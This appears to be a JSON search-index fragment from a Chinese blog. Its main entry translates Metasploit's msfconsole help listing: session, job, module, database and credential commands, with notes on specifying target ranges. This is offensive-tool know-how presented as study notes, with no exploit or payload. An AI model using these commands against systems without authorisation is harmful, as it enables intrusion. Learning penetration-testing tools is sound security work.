是目前全世界最多人使用的系统漏洞扫描与分析软件。","tags":[{"name":"安全","slug":"安全","permalink":"https://www.auwaves.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"工具","slug":"工具","permalink":"https://www.auwaves.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"Metasploit命令学习","text":"概述为了方便自己后期的学习，我把metasploit的帮助信息简单翻译了一下，包括命令和一些用法描述。 核心命令命令 描述 ------- ----------- ? 帮助菜单 banner 在命令行里显示一个好看的metasploit图案（一个很有趣的命令^0^） cd 更改当前工作目录 color 启用或禁用颜色输出 connect 连接到一个主机 exit 退出msfconsole get 获得一个上下文特定变量的值 getg 获得一个全局变量的值 grep 从另一个命令的输出中查找符合条件的行 help 帮助菜单 history 显示历史命令 load 加载框架插件 quit 退出msfconsole（有提示Y/N） repeat 重复一个命令列表 route 通过会话路由流量 save 保存活动数据 sessions 转储会话列表并显示有关会话的信息 set 设置一个上下文特定变量的值 setg 设置一个全局变量的值 sleep 在指定的秒数内不执行任何操作 spool 将控制台输出写入某个文件 threads 查看和操纵后台线程 unload 卸载框架插件 unset 取消设置一个或多个上下文特定变量的值 unsetg 取消设置一个或多个全局变量的值 version 显示框架和控制台库版本号模块命令命令 描述 ------- ----------- advanced 显示一个或多个模块的高级选项 back 从当前上下文后退 info 显示一个或多个模块的信息 loadpath 从路径搜索模块并加载 options 显示一个或多个模块的全局选项 popm 将最新模块弹出堆栈并使其激活 previous 将先前加载的模块设置为当前模块 pushm 将活动模块或模块列表推入模块堆栈 reload_all 从所有定义的模块路径重新加载所有模块 search 搜索模块名称和描述 show 显示给定类型的模块，或者所有模块 use 按名称选择模块作业命令命令 描述 ------- ----------- handler 启动有效负载处理程序作为作业 jobs 显示和管理作业 kill 杀死作业 rename_job 重命名作业资源脚本命令命令 描述 ------- ----------- makerc 将启动之后输入的命令保存到文件中 resource 运行文件中的命令数据库后端命令命令 描述 ------- ----------- analyze 分析有关特定地址或地址范围的数据库信息 db_connect 连接到现有的数据服务 db_disconnect 断开当前数据服务 db_export 导出包含数据库内容的文件 db_import 导入扫描结果文件（将自动检测文件类型） db_nmap 执行nmap并自动记录输出 db_rebuild_cache 重建数据库存储的模块缓存 db_remove 删除保存的数据服务条目 db_save 将当前数据服务连接保存为默认值，以便在启动时重新连接 db_status 显示当前数据服务状态 hosts 列出数据库中的所有主机 loot 列出数据库中的所有Loot(战利品) notes 列出数据库中的所有注释 services 列出数据库中的所有服务 vulns 列出数据库中的所有漏洞 workspace 在数据库工作区之间切换凭证后端命令命令 描述 ------- ----------- creds 列出数据库中的所有证书开发人员命令命令 描述 ------- ----------- edit 使用首选的编辑器编辑当前模块或文件 irb 在当前上下文中打开一个交互式Ruby Shell log 如果可以，将framework.log显示到页面末尾 pry 在当前模块或框架上打开Pry调试器 reload_lib 从指定路径重新加载Ruby库文件msfconsolemsfconsole是Metasploit框架的主要接口。使用者可以通过这个控制台高效的使用MSF中的各种功能。可以在终端或命令行界面直接输入msfconsole启动。 范围和列表上面列出的许多命令和选项都可以使用范围，所以不必手动列出每个需要的事物。所有范围均包括在内。 ID范围带有ID列表的命令可以使用范围来提供帮助。各个ID必须以,分隔（不允许有空格），范围可以用-或..表示。 IP范围这里有多种方法可以用来指定能混合在一起的IP地址范围： 第一种方法是一个IP列表，这些IP仅由&#39; &#39;（ASCII空格）分隔，并带有可选的,。 第二种方式是用两个完整的IP地址表示范围，格式为“开始地址-结束地址”，例如127.0.1.44-127.0.2.33。 也可以使用CIDR规范，但是，与RFC相反，必须将整个地址提供给Metasploit，例如127.0.0.0/8，而不是127/8。 此外，可以将网络掩码与域名一起使用以动态解析要定位的块。 所有这些方法都适用于IPv4和IPv6地址。也可以根据NMAP目标规范用特殊的八位位组范围指定IPv4地址。 示例终止第一个会话： sessions -k 1停止一些正在运行的作业： jobs -k 2-6,7,8,11..15检查一组IP地址： check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255定位一组IPv6主机： set RHOSTS fe80::3990:0000/110, ::1-::f0f0定位来自解析域名的块： set RHOSTS www.example.test/24 翻译：Boringboys原文链接：https://www.boringboys.top/2019/03/29/Metasploit命令/版权声明：本文采用BY-NC-SA协议授权，转载请遵守此协议","path":"2018/03/29/Metasploit命令学习/","date":"03-29","excerpt":"概述为了方便自己后期的学习，我把metasploit的帮助信息简单翻译了一下，包括命令和一些用法描述。","tags":[{"name":"安全","slug":"安全","permalink":"https://www.auwaves.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"工具","slug":"工具","permalink":"https://www.auwaves.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"学习","slug":"学习","permalink":"https://www.auwaves.com/tags/%E5%AD%A6%E4%B9%A0/"}]},{"title":"Hello World?","text":"概述好！！！ 好～～～～！！！","path":"1899/11/30/Hello_World/","date":"11-30","excerpt":"概述好！！！","tags":[{"name":"延迟退休","slug":"延迟退休","permalink":"https://www.auwaves.com/tags/%E5%BB%B6%E8%BF%9F%E9%80%80%E4%BC%91/"},{"name":"离婚冷静","slug":"离婚冷静","permalink":"https://www.auwaves.com/tags/%E7%A6%BB%E5%A9%9A%E5%86%B7%E9%9D%99/"},{"name":"恶意返乡","slug":"恶意返乡","permalink":"https://www.auwaves.com/tags/%E6%81%B6%E6%84%8F%E8%BF%94%E4%B9%A1/"},{"name":"异常维权","slug":"异常维权","permalink":"https://www.auwaves.com/tags/%E5%BC%82%E5%B8%B8%E7%BB%B4%E6%9D%83/"}],"preview":null}],"categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"https://www.auwaves.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"Windows Terminal","slug":"Windows-Terminal","permalink":"https://www.auwaves.com/tags/Windows-Terminal/"},{"name":"grep","slug":"grep","permalink":"https://www.auwaves.com/tags/grep/"},{"name":"xargs","slug":"xargs","permalink":"https://www.auwaves.com/tags/xargs/"},{"name":"管道","slug":"管道","permalink":"https://www.auwaves.com/tags/%E7%AE%A1%E9%81%93/"},{"name":"Linux","slug":"Linux","permalink":"https://www.auwaves.com/tags/Linux/"},{"name":"WEB","slug":"WEB","permalink":"https://www.auwaves.com/tags/WEB/"},{"name":"CTF","slug":"CTF","permalink":"https://www.auwaves.com/tags/CTF/"},{"name":"逆向","slug":"逆向","permalink":"https://www.auwaves.com/tags/%E9%80%86%E5%90%91/"},{"name":"广播域","slug":"广播域","permalink":"https://www.auwaves.com/tags/%E5%B9%BF%E6%92%AD%E5%9F%9F/"},{"name":"冲突域","slug":"冲突域","permalink":"https://www.auwaves.com/tags/%E5%86%B2%E7%AA%81%E5%9F%9F/"},{"name":"网络","slug":"网络","permalink":"https://www.auwaves.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"正则匹配","slug":"正则匹配","permalink":"https://www.auwaves.com/tags/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D/"},{"name":"安全","slug":"安全","permalink":"https://www.auwaves.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"学习","slug":"学习","permalink":"https://www.auwaves.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"汇编语言","slug":"汇编语言","permalink":"https://www.auwaves.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"延迟退休","slug":"延迟退休","permalink":"https://www.auwaves.com/tags/%E5%BB%B6%E8%BF%9F%E9%80%80%E4%BC%91/"},{"name":"离婚冷静","slug":"离婚冷静","permalink":"https://www.auwaves.com/tags/%E7%A6%BB%E5%A9%9A%E5%86%B7%E9%9D%99/"},{"name":"恶意返乡","slug":"恶意返乡","permalink":"https://www.auwaves.com/tags/%E6%81%B6%E6%84%8F%E8%BF%94%E4%B9%A1/"},{"name":"异常维权","slug":"异常维权","permalink":"https://www.auwaves.com/tags/%E5%BC%82%E5%B8%B8%E7%BB%B4%E6%9D%83/"}]}